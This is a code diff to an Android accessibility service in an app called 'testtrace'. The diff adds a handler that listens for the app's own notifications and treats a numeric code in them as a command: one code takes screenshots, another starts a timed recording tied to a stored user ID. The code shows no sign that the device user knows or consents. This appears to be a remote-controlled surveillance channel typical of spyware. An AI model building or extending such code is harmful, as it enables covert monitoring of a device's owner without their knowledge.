@@ -1,12 +1,18 @@
 package com.reiserx.testtrace.Screenshot;
 
+import android.accessibilityservice.AccessibilityServiceInfo;
+import android.app.Notification;
 import android.content.SharedPreferences;
 import android.graphics.Bitmap;
 import android.media.MediaRecorder;
 import android.net.Uri;
 import android.os.Build;
+import android.os.Handler;
+import android.os.Looper;
+import android.os.Parcelable;
 import android.util.Log;
 import android.view.Display;
+import android.view.KeyEvent;
 import android.view.accessibility.AccessibilityEvent;
 import android.widget.Toast;
 
@@ -36,10 +42,6 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
 
     public static accessibilityService instance;
 
-    public static void setInstance(accessibilityService instances) {
-        instance = instances;
-    }
-
     FirebaseDatabase mdb;
     DatabaseReference reference;
 
@@ -48,13 +50,70 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
+        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
+        info.eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;
+        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
+        info.notificationTimeout = 100;
+        setServiceInfo(info);
         Toast.makeText(this, "Service started", Toast.LENGTH_SHORT).show();
         instance = this;
     }
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
-        instance = this;
+
+        if (accessibilityEvent.getPackageName().equals("com.reiserx.testtrace")) {
+
+            if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
+                Log.d(TAG, "Recieved event");
+                Parcelable data = accessibilityEvent.getParcelableData();
+                if (data instanceof Notification) {
+                    Log.d(TAG, "Recieved notification");
+                    Notification notification = (Notification) data;
+
+                    if (notification.extras.getString("android.title") != null && notification.extras.getString("android.text") != null) {
+
+                        String title = notification.extras.getString("android.title");
+                        if (title.contains("com.reiserx.testtrace.accessibility")) {
+                            SharedPreferences save = getSharedPreferences("users", MODE_PRIVATE);
+                            String UserID = save.getString("UserID", "");
+
+                            int message = Integer.parseInt(notification.extras.getString("android.text"));
+                            Log.d(TAG, title);
+                            switch (message) {
+                                case 1:
+                                    takeScreenshots(UserID);
+                                    Log.d(TAG, String.valueOf(message));
+                                    break;
+                                case 2:
+                                    long value = Long.parseLong(title.replaceAll("[\\D]", ""));
+                                    final Handler handler = new Handler(Looper.getMainLooper());
+                                    accessibilityService.instance.startRecording();
+                                    handler.postDelayed(() -> accessibilityService.instance.stopRecording(UserID), value);
+                                    break;
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    @Override
+    protected boolean onKeyEvent(KeyEvent event) {
+        int action = event.getAction();
+        int keyCode = event.getKeyCode();
+
+        if (action == KeyEvent.ACTION_UP) {
+            if (keyCode == KeyEvent.KEYCODE_VOLUME_UP) {
+                Log.d(TAG, "KeyUp");
+                instance = this;
+            } else if (keyCode == KeyEvent.KEYCODE_VOLUME_DOWN) {
+                Log.d(TAG, "KeyDown");
+                instance = this;
+            }
+        }
+        return super.onKeyEvent(event);
     }
 
     @Override
